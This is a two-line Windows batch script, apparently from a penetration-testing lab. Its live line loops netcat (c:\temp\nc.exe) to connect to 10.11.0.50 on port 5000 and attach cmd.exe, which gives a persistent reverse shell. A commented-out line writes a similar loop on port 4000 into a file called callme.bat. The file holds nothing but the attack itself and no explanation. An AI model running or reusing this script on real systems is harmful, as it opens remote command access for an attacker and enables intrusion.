@REM echo for /l %%x in (1,1,9999) do (nc.exe 10.11.0.50 4000 -e cmd.exe )>callme.bat
for /l %%x in (1,1,999999) do (c:\temp\nc.exe 10.11.0.50 5000 -e cmd.exe )
